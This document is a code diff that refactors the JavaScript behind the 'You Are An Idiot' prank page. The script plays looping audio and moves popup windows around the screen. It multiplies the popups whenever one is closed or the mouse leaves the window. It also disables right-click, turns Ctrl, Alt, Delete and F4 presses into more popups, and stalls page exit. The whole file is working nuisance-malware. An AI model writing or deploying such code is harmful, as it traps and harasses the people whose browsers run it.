@@ -1,73 +1,71 @@
-/* [Oct 2021] Added to comply with strict browser policies. */
+/* ================= Audio Handling ================= */
+document.addEventListener('click', function playMusicOnce() {
+    const audio = document.getElementById('youare-audio');
+    const micon = document.getElementById('youare-micon');
 
-document.addEventListener('click', musicPlay);
+    if (!audio || !micon) return;
 
-function musicPlay() {
-    var audio = document.getElementById('youare-audio');
-    var micon = document.getElementById('youare-micon');
-    
-    micon.addEventListener('click', musicPlay);
-    
-    if (audio.duration > 0 && audio.paused) {
+    if (audio.paused) {
         audio.play();
         micon.src = "images/speaker.png";
-    }
-    else {
+    } else {
         audio.pause();
         audio.currentTime = 0;
         micon.src = "images/speakerm.png";
     }
-    
-    document.removeEventListener('click', musicPlay);
-}
 
-var faudio = new Audio('youare.mp3');
+    // Remove the document-level listener after first user click (required by browsers)
+    document.removeEventListener('click', playMusicOnce);
+}, { once: true });
 
-faudio.addEventListener('timeupdate', function() {
-    if (this.currentTime > this.duration - .45) {
+// Looping background audio with a small buffer
+const faudio = new Audio('youare.mp3');
+faudio.addEventListener('timeupdate', function () {
+    if (this.currentTime > this.duration - 0.45) {
         this.currentTime = 0;
         this.play();
     }
 });
 
-/* [Oct 2021] End part. */
-
+/* ================= Bookmark (IE only) ================= */
 function bookmark() {
-    if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
-        var url = "lol.html";
-        var title = "‎‎Idiot!";
-        window.external.AddFavorite(url, title);
+    if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
+        window.external.AddFavorite("lol.html", "‎‎Idiot!");
     }
 }
 
-var xOff = 5;
-var yOff = 5;
-var xPos = 400;
-var yPos = -100;
-var flagRun = 1;
+/* ================= Window Movement ================= */
+let xOff = 5, yOff = 5;
+let xPos = 400, yPos = -100;
+let flagRun = 1;
 
-function changeTitle(title) {
-    document.title = title;
-}
-
-var openWindows = []; // Track all opened popups
+const openWindows = []; // Track all popups
 
 function openWindow(url) {
-    var aWindow = window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
+    const width = 357;
+    const height = 330;
+    const left = Math.floor((screen.width - width) / 2);
+    const top = Math.floor((screen.height - height) / 2);
+
+    const features = `menubar=no,status=no,toolbar=no,resizable=no,width=${width},height=${height},left=${left},top=${top},noopener,noreferrer`;
+
+    const aWindow = window.open(url, "_blank", features);
+
     if (aWindow) {
         openWindows.push(aWindow);
 
         // Monitor for closure
-        var timer = setInterval(function() {
-            // Remove closed windows from the array
-            openWindows = openWindows.filter(w => !w.closed);
+        const timer = setInterval(() => {
+            // Remove closed windows
+            for (let i = openWindows.length - 1; i >= 0; i--) {
+                if (openWindows[i].closed) openWindows.splice(i, 1);
+            }
 
+            // When this specific window closes, spawn duplicates
             if (aWindow.closed) {
                 clearInterval(timer);
-
-                // Duplicate all currently open popups
-                var countToOpen = Math.max(1, openWindows.length); // Ensure at least 1
-                for (var i = 0; i < countToOpen; i++) {
+                const countToOpen = Math.max(1, openWindows.length);
+                for (let i = 0; i < countToOpen; i++) {
                     openWindow('lol.html');
                 }
             }
@@ -75,78 +73,63 @@ function openWindow(url) {
     }
 }
 
-function proCreate() {    
-    for (var i = 0; i < 5; i++) {
+function proCreate() {
+    for (let i = 0; i < 5; i++) {
         openWindow('lol.html');
     }
 }
 
-function newXlt() {
-    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-    window.focus();
-}
+// Random direction changes
+function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
+function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
+function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
+function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
 
-function newXrt() {
-    xOff = Math.ceil(7 * Math.random())  * 5 - 10;
-    window.focus();
-}
+function fOff() { flagRun = 0; }
 
-function newYup() {
-    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-    window.focus();
-}
-
-function newYdn() {
-    yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
-    window.focus();
-}
-
-function fOff(){
-    flagRun = 0;
-}
-
+// Main bouncing logic
 function playBall() {
     xPos += xOff;
     yPos += yOff;
-    
-    if (xPos > screen.width - 357) newXlt();    
+
+    if (xPos > screen.width - 357) newXlt();
     if (xPos < 0) newXrt();
-    
-    if (yPos > screen.height - 330) newYup();         
+    if (yPos > screen.height - 330) newYup();
     if (yPos < 0) newYdn();
-    
-    if (flagRun == 1) {
-        window.moveTo(xPos, yPos);
-        setTimeout('playBall()', 1);
+
+    if (flagRun === 1) {
+        try {
+            window.moveTo(xPos, yPos);
+        } catch (e) {
+            console.warn("Window movement blocked by browser.");
+            flagRun = 0;
+        }
+        setTimeout(playBall, 16); // ~60fps for smooth movement
     }
 }
 
-/* [Oct 2021] Better code. */
+/* ================= Window Events ================= */
 window.onload = function () {
     flagRun = 1;
     playBall();
-    bookmark(); // Internet Explorer only (what a piece of sugar)
-    return true;
-}
+    bookmark(); // IE only
+};
 
 window.onmouseout = function () {
     proCreate();
-    return null;
 };
 
-window.oncontextmenu = function() {
-    return false;
-}
+window.oncontextmenu = function () {
+    return false; // Disable right-click
+};
 
-window.onkeydown = function() {    
-    var keyCode = event.keyCode;
-    if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {    
+window.onkeydown = function (event) {
+    const keyCode = event.keyCode;
+    if ([17, 18, 46, 115].includes(keyCode)) { // Ctrl, Alt, Delete, F4
         proCreate();
     }
-    return null;
-}
+};
 
-window.onbeforeunload = function() {
+window.onbeforeunload = function () {
     return " ";
 };
-/* [Oct 2021] End of amendments. */
